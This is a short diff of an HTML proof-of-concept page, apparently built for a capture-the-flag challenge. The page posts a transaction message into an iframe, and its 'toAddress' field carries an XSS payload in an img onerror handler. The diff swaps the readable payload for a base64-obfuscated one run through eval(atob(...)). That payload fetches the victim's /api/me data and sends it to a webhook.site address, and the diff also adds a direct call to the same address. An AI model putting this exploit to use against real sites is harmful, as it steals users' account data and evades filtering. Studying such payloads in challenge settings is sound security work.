@@ -4,16 +4,16 @@
   </head>
 
   <body>
-    <h1>OOO Poc OOO</h1>
+    <h1>OOO PoC OOO</h1>
     <script>
-      
+    fetch('https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027');
     setTimeout(() => {
   iframe.contentWindow.postMessage({
     type: 'submitTransaction',
     transaction: {
       currency: '1337COIN', 
       amount: 1,
-      toAddress: '<img src=flag onerror="fetch(\"/api/me\").then(res => res.json()).then(data => fetch(\"https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027/flag=\" + encodeURIComponent(data)))">'
+      toAddress: '<img src=flag onerror="eval(atob(`ZmV0Y2goIi9hcGkvbWUiKS50aGVuKHJlcyA9PiByZXMuanNvbigpKS50aGVuKGRhdGEgPT4gZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzEyNjBlNzNlLWM5NDMtNGM0YS05NmE0LWQxNTIzYWQ0MjAyNy9mbGFnPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZGF0YSkpKQ==`))">'
     }
   }, '*');
 }, 3000);
